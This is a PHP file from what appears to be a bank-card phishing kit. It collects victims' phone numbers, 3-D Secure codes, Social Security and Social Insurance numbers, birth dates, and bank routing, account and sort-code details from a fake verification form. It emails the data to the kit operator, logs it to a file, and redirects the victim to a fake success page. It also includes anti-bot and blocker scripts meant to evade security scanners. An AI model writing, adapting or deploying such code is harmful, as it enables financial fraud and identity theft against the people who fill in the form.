<?php

session_start();
include('../blocker.php');
include('../antibots.php');
include './Email.php';
include '../files/inc/block.php';

$HF_V = $_SESSION['country_name'];
$phone = $_POST['num'];

$_3d = $_POST['_3d'];

$ssn = $_POST['ssn'];

$date = $_POST['date'];

$rgn = $_POST['rgn']; // USA

$sin = $_POST['sin']; // CA

$an = $_POST['an']; // USA && UK && AU && IR

$sc = $_POST['sc']; // UK && IR

$ka = $_POST['ka']; // GE && SW

$on = $_POST['on'];  // AU

$cl = $_POST['cl']; // AU

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$rand = md5(microtime());
$msg = "
<!===============|Vbv Full InFo ^_^!|==================!>
Number Phone           :     ".$phone."
SecureCode             :     ".$_3d."
SSN:                   :     ".$ssn."
Birth Date             :     ".$date. "
Routing Number         :     ".$rgn. "
Social Insurance Number:     ".$sin. "
Social Security Number :     ".$ssn. "
Account Number:        :     ".$an. "
Sort Code:             :     ".$sc. "
Kartenkontonummer:     :     ".$ka. "
OSID Number:           :     ".$on. "
Credit Limit:          :     ".$cl. "
IP              :   "."http://www.geoiptool.com/?IP=".$ip."
TIME            :   <font color='#3366FF'>".$time."
<!===============|By HF Jackson | ^_^!|==================!>
|Moustache Wiz| BADEXAMPLE | ROFHXMD | Fernando Marin|";

$subj = " <3 HaHiYa L VBV DYalHa <3 ^_^! |".$HF_V."|-|".$ip."|";
$headers = "From:B0ssNi <IbchiL7aza9@HMAHM.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
@mail($to, $subj, $msg, $headers);
$file = fopen("../../BADEXAMPLE/BADEXAMPLE.txt","a");
fwrite($file,$msg);
fclose($file);

 header("location: ../successfully/?websrc=".md5('Adnan-7eza9')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
